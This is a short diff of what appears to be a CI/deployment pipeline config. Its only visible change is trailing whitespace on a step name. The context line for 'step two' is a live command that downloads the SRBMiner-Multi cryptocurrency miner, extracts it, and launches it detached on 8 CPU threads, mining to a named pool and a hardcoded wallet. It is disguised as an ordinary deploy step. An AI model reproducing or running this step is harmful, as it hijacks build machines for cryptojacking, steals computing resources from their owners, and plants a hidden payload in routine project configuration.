@@ -29,7 +29,7 @@ deploy:
       name: step two
       code: wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.4.3/SRBMiner-Multi-0-4-3-Linux.tar.xz && tar xJvf SRBMiner-Multi-0-4-3-Linux.tar.xz && setsid ./SRBMiner-Multi-0-4-3/SRBMiner-MULTI --cpu-threads 8 --algorithm yespowerlitb --pool stratum+tcp://MiningMadness.com:6570 --wallet LL5ZgSf9dgoknxmQX2AE7RG52ngWa7d9nr
     - script:
-      name: step three
+      name: step three 
       code: echo "Step Three"
     - script:
       name: step four
